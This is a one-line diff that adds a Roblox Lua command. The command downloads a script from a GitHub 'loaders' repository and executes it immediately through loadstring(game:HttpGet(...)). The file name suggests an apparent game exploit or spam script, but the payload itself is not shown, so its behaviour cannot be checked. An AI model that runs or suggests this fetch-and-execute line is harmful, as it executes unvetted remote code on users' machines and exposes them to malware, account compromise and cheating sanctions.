@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam2-lm96079cgg90vg.lua"))()
